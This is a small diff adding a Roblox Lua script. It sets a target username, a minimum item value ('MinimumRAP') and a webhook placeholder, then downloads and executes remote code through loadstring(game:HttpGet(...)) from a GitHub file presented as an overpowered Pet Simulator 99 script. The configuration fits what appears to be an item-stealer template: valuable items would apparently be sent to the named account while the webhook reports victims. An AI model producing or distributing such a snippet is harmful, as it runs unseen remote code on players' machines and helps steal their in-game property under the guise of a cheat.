@@ -1,0 +1,6 @@
+Username = "utguweug"
+Username2 = "utguweug"
+MinimumRAP = 1000
+Webhook = "Your Webhook"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
